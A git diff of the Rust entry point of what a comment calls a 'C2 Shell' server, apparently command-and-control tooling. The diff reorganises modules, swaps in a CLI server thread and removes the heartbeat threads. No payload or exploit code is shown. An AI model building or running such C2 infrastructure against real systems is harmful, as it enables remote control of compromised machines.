@@ -1,12 +1,19 @@
-use std::io::Write;
-use std::net::TcpListener;
-use std::{io, thread};
-use crate::handler::utils::{handle_client,
-                            server};
-use crate::config::ClientManager;
-use crate::handler::heartbeats::{listen_for_heartbeats, monitor_heartbeats};
-mod handler;
-mod config;
+mod client;
+mod terminal;
+
+use std::io::{BufRead, BufReader, Write};
+use std::net::{TcpListener, TcpStream};
+use std::{io, process, thread};
+use std::collections::HashMap;
+use std::error::Error;
+use std::sync::{Arc, Mutex};
+use std::time::Instant;
+use serde::{Deserialize, Serialize};
+
+
+use client::ClientManager;
+use terminal::{cli_server, handle_client};
+
 
 /// Entry point for the server application.
 ///
@@ -22,14 +29,7 @@ fn main() {
 
     // Thread for the C2 Shell
     let server_client_manager_clone = client_manager.clone();
-    thread::spawn(|| server(server_client_manager_clone));
-
-    // Thread to remove Clients not connected
-    let heartbeat_client_manager_clone = client_manager.clone();
-    thread::spawn(move || {
-        // println!("[I] Monitor heartbeats");
-        monitor_heartbeats(heartbeat_client_manager_clone);
-    });
+    thread::spawn(|| cli_server(server_client_manager_clone));
 
     for stream in listener.incoming() {
         match stream {
@@ -41,11 +41,6 @@ fn main() {
                     handle_client(stream, client_manager_clone);
                 });
 
-                // Thread that listenes for the heartbeats for this client
-                let listen_heartbeats_client_manager_clone = client_manager.clone();
-                thread::spawn(move || {
-                    listen_for_heartbeats(listen_heartbeats_client_manager_clone, ip)
-                });
             },
             Err(e) => {
                 println!("[E] Error while listening for new connections: {}", e);
@@ -53,4 +48,13 @@ fn main() {
         }
     }
 }
+
+
+
+
+
+
+
+
+
 
